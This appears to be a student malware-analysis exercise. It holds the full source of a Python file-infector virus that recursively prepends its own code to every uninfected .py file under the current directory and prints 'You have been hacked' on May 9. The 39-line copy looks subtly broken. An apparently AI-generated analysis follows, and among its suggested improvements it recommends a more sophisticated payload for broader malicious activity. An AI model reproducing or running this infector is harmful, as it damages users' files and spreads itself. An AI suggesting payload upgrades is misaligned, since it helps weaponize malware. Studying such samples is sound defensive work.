
# Script Name:                  challenge14.py
# Author:                       jai.me.angel.hi
# Date of latest revision:      12/16/2023
# Purpose:                      Python Malware Analysis 
# Additional Source             ChatGPT

#!/usr/bin/python3
import os
import datetime

# The virus signature that will be used to check if a file is infected.
SIGNATURE = "VIRUS"

# Function to locate Python files in a given directory and its subdirectories.
def locate(path):
    # List to store the paths of targeted files.
    files_targeted = []
    # Get the list of files in the specified directory.
    filelist = os.listdir(path)
    
    # Iterate through each file in the directory.
    for fname in filelist:
        # Check if the file is a directory.
        if os.path.isdir(path+"/"+fname):
            # Recursively call the locate function for subdirectories.
            files_targeted.extend(locate(path+"/"+fname))
        # Check if the file has a ".py" extension.
        elif fname[-3:] == ".py":
            # Initialize a flag to check if the file is already infected.
            infected = False
            # Open the file and check each line for the virus signature.
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # If the file is not infected, add its path to the list.
            if not infected:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Function to infect the targeted files with the virus.
def infect(files_targeted):
    # Open the virus file to read its content.
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    # Read the first 39 lines of the virus file and store them in a string.
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    # Iterate through each targeted file.
    for fname in files_targeted:
        # Open the targeted file for reading.
        f = open(fname)
        temp = f.read()
        f.close()
        # Open the targeted file for writing and prepend the virus content.
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()

# Function to check the current date and print a message if it matches a specific date.
def detonate():
    # Check if the current date is May 9th.
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Locate Python files in the current directory and its subdirectories.
files_targeted = locate(os.path.abspath(""))
# Infect the located files with the virus.
infect(files_targeted)
# Check if the current date is May 9th and print a message if true.
detonate()

--------------------------------------------------- AI Analysis
#Core Python/Coding Tools:

os module: Used for interacting with the operating system, such as listing files in a directory.
datetime module: Used for working with dates and times.
File I/O: The script extensively uses file input/output operations to read, modify, and write files.
Loops and Conditionals: Employed for iterating through files, checking conditions, and performing actions accordingly.
Functions: Modularized code into functions such as locate, infect, and detonate to organize and encapsulate functionality.
String Manipulation: Used for checking file extensions and manipulating file content.
Type of Malware:
This script is a type of malware known as a file-infector virus. Specifically, it infects Python files by appending its own code to them. The virus has a trigger date (May 9th) that, when matched, leads to the execution of a payload (printing a hacking message).

Code Quality:

Readability: The code is relatively readable, with meaningful variable and function names.
Comments: The script includes comments that explain the purpose of functions, lines, and sections of the code, aiding in understanding.
Code Redundancy: The script contains some redundancy, such as not properly closing the virus file (virus.close should be virus.close()).
Security Concerns: The script lacks proper error handling and may have unintended consequences if executed in certain environments.
Maintenance: The script might be hard to maintain as the codebase grows due to its simplistic structure.
Possible Improvements:

Error Handling: Implement robust error handling to handle exceptions during file operations or other potential issues.
Logging: Introduce logging instead of direct print statements for better monitoring.
Code Modularization: Further modularize the code for better organization and reusability.
Enhanced Payload: Depending on the intended use, a more sophisticated payload could be added for a broader range of malicious activities.
Protective Measures: Consider implementing protective measures to prevent the virus from infecting certain files or systems.
It's important to note that creating and distributing malware is illegal and unethical. The provided analysis is for educational purposes only, and the script should not be used or modified for malicious activities.






